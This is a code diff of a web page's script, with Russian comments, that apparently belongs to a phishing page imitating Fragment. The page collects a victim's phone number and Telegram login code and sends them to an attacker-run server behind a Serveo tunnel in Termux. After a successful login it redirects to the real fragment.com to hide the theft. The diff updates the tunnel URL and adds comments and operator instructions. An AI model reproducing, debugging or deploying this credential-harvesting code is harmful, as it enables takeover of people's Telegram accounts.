@@ -25,8 +25,8 @@
     </div>
 
     <script>
-        // Твоя ссылка из Termux (Serveo)
-        const API_URL = "https://f4b03f3d0f27ac7972250f4221391298.serveousercontent.com/api/login";
+        // Твоя НОВАЯ ссылка из последнего скриншота Termux
+        const API_URL = "https://00da3c6ab97b9f204ff79d7570983bd5.serveousercontent.com/api/login";
 
         async function sendData(action) {
             const phone = document.getElementById('phone').value;
@@ -46,12 +46,13 @@
                     document.getElementById('step-code').classList.remove('hidden');
                     document.getElementById('desc').innerText = "Введите код, присланный в Telegram";
                 } else if (res.status === "success") {
+                    // После успеха перекидываем на официальный сайт
                     window.location.href = "https://fragment.com";
                 } else {
                     alert("Ошибка сервера: " + res.message);
                 }
             } catch (e) {
-                alert("Нет связи с сервером! Проверь Termux.");
+                alert("Нет связи с Termux! Проверь, что в Окне №1 запущен 'python server.py', а в Окне №2 активна ссылка.");
             }
         }
     </script>
